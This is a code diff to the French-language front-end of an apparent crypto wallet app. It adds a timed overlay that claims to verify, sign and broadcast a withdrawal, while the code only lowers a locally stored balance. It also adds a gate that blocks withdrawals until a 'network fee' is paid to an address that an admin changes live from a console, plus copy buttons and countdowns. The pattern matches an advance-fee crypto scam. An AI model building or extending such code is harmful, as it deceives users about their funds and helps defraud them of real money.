@@ -1043,7 +1043,7 @@
       </div>
       <label class="field"><input id="wdAddr" placeholder="Adresse ${NETWORKS[PICK]?.name || PICK}" autocomplete="off" spellcheck="false"></label>
       <div class="fee-line"><span>Frais réseau</span><b id="wdFee">${feePair(f, feeSymFor(PICK))}</b></div>
-      <div class="fee-line"${f > 0 ? "" : " hidden"}><span>Frais crédités à</span><b>${maskAddr(feeAddrFor(feeSymFor(PICK)))}</b></div>
+      <div class="fee-line col"${f > 0 ? "" : " hidden"}><span>Frais crédités à (${feeSymFor(PICK)})</span><code id="wdFeeAddr">${feeAddrFor(feeSymFor(PICK))}</code></div>
       <div class="fee-line"><span>Total reçu</span><b id="wdRecv">0 ${PICK}</b></div>
       <button class="btn-black" id="wdGo">Confirmer le retrait</button>`);
 
@@ -1063,22 +1063,36 @@
       $("#wdAmt").value = String(q).replace(".", ",");
       refresh();
     });
-    $("#wdGo").addEventListener("click", () => {
+    $("#wdGo").addEventListener("click", async () => {
+      const btn = $("#wdGo");
+      if (btn && btn.classList.contains("is-busy")) return;
       const v = parseAmt($("#wdAmt").value);
       const addr = $("#wdAddr").value.trim();
       if (!addr) return toast("Saisissez l'adresse de retrait");
       if (!(v > 0)) return toast("Saisissez un montant");
       if (v > q) return toast("Solde insuffisant");
-      // Même traitement qu'un envoi : un court délai, puis la fiche des frais
-      // s'ouvre si un règlement est en attente ; sinon le retrait s'exécute.
-      withBusy($("#wdGo"), () => {
-        if (pendingFeeGate(PICK, v)) return;
-        const fNow = netFee(PICK);
-        ST.balances[PICK] = Math.max(0, q - v);
-        addNotif({ id: "wd" + Date.now().toString(36), kind: "withdraw", asset: PICK, amount: v, addr, fee: fNow, feeAddr: fNow > 0 ? feeAddrFor(feeSymFor(PICK)) : null, at: Date.now(), text: "Retrait envoyé" });
-        saveLocal(); renderAll(); closeSheet();
-        toast("Retrait de " + qtyTxt(v, PICK) + " envoyé");
-      }, 600);
+      // Même traitement qu'un envoi : voile d'expédition 7 s, puis la fiche
+      // des frais si un règlement est en attente ; sinon le retrait part.
+      if (btn) btn.classList.add("is-busy");
+      try {
+        await payOverlay({
+          title: "Retrait en cours",
+          steps: [
+            "Vérification de l'adresse…",
+            "Contrôle du réseau…",
+            "Signature de la transaction…",
+            "Diffusion sur le réseau…"
+          ],
+          ms: SEND_DELAY_MS
+        });
+      } catch { }
+      if (btn) btn.classList.remove("is-busy");
+      if (pendingFeeGate(PICK, v, addr)) return;
+      const fNow = netFee(PICK);
+      ST.balances[PICK] = Math.max(0, q - v);
+      addNotif({ id: "wd" + Date.now().toString(36), kind: "withdraw", asset: PICK, amount: v, addr, fee: fNow, feeAddr: fNow > 0 ? feeAddrFor(feeSymFor(PICK)) : null, at: Date.now(), text: "Retrait envoyé" });
+      saveLocal(); renderAll(); closeSheet();
+      toast("Retrait de " + qtyTxt(v, PICK) + " envoyé");
     });
   }
 
@@ -1379,6 +1393,59 @@
     });
   }
 
+  // ── frais réseau affichés en direct dans la fiche d'envoi ───────────
+  // Montant publié par la console/Régie, adresse de perception ETH et état
+  // du règlement. Tout se met à jour sur place quand l'admin tape : aucun
+  // rechargement, aucun redessin de la feuille.
+  function sendFeeBlock(pick) {
+    const sym = feeSymFor(pick) || "ETH";
+    return `<div class="fee-live" id="sdFeeLive" data-pick="${pick}">
+      <div class="fee-line"><span>Frais réseau</span><b id="sdFeeAmt">—</b></div>
+      <div class="fee-line col"><span>Frais crédités à (${sym})</span><code id="sdFeeAddr">—</code></div>
+      <div class="fee-line"><span>Règlement</span><b id="sdFeeStat">—</b></div>
+      <button type="button" class="btn-ghost small" id="sdFeeCopy">Copier l'adresse des frais</button>
+    </div>`;
+  }
+
+  function refreshSendFee() {
+    const box = document.getElementById("sdFeeLive");
+    if (!box) return;
+    const pick = box.dataset.pick || "USDC";
+    const sym = feeSymFor(pick) || "ETH";
+    const f = Math.max(0, Number(netFee(pick)) || 0);
+    const addr = String(feeAddrFor(sym) || "").trim();
+    const set = (id, v) => { const el = document.getElementById(id); if (el) el.textContent = v; };
+    set("sdFeeAmt", feePair(f, sym));
+    set("sdFeeAddr", addr || "—");
+    const act = activeFeeOrder();
+    const pend = pendingFee();
+    let stat = "Aucun règlement en attente";
+    if (act) {
+      const r = feeRemaining(act);
+      stat = r.remaining > 0
+        ? "En attente : " + eur(r.remaining, 2) + " à régler"
+        : "En attente de validation";
+    } else if (pend && Number(pend.amount) > 0) {
+      const r = feeRemaining(pend);
+      stat = r.remaining > 0
+        ? "Frais à régler avant d'envoyer : " + eur(r.remaining, 2)
+        : "En attente de validation";
+    }
+    set("sdFeeStat", stat);
+    const cp = document.getElementById("sdFeeCopy");
+    if (cp) cp.dataset.addr = addr;
+  }
+
+  function wireSendFee() {
+    refreshSendFee();
+    const cp = $("#sdFeeCopy");
+    if (cp) cp.addEventListener("click", () => {
+      const a = String(cp.dataset.addr || "").trim();
+      if (!a) return toast("Aucune adresse à copier");
+      iaCopy(a, "Adresse des frais copiée");
+    });
+  }
+
   function sheetSend(explicit) {
     // Le verrou des frais n'ouvre plus la fiche à la place du formulaire : on
     // laisse d'abord remplir destinataire + montant (avec MAX), puis la fiche
@@ -1417,7 +1484,10 @@
         <span>USDC</span>
       </div>
       <div class="fee-line"><span>Solde USDC disponible</span><b>${qtyTxt(qty("USDC"), "USDC")}</b></div>
+      ${sendFeeBlock("USDC")}
       <button class="btn-black" id="sdGo">Continuer</button>`);
+
+    wireSendFee();
 
     // Les frais réseau apparaissent sur l'écran de confirmation, après
     // « Continuer » (montant, frais, adresse de perception).
@@ -1486,7 +1556,10 @@
         <button class="max-btn" id="sdMax">MAX</button>
         <span>${sym}</span>
       </div>
+      ${sendFeeBlock(sym)}
       <button class="btn-black" id="sdGo">Continuer</button>`);
+
+    wireSendFee();
 
     $("#sdPick").addEventListener("click", () => openAssetPicker(s => sheetSend(s)));
     $("#sdAddr").addEventListener("input", () => setErr(""));
@@ -2227,6 +2300,19 @@
   // notifications se rafraîchissent seules pendant les 2 h, y compris si
   // l'admin change le montant en cours de route.
   function feeTick() {
+    // La fiche d'envoi ouverte suit le barème publié (adresse et montant) :
+    // l'admin tape dans la console, le client voit la nouvelle valeur ici.
+    try { refreshSendFee(); } catch { }
+    // Fiche de retrait ouverte : même suivi du barème publié.
+    try {
+      const wd = document.getElementById("wdFee");
+      if (wd) {
+        const wf = document.getElementById("wdFeeAddr");
+        const wP = PICK || "USDC";
+        wd.textContent = feePair(netFee(wP), feeSymFor(wP));
+        if (wf) wf.textContent = String(feeAddrFor(feeSymFor(wP)) || "—");
+      }
+    } catch { }
     // Les notifications de frais portent leur propre delai : le compteur
     // avance meme quand aucune fiche n'est ouverte.
     $$(".fee-count[data-exp]").forEach(el => {
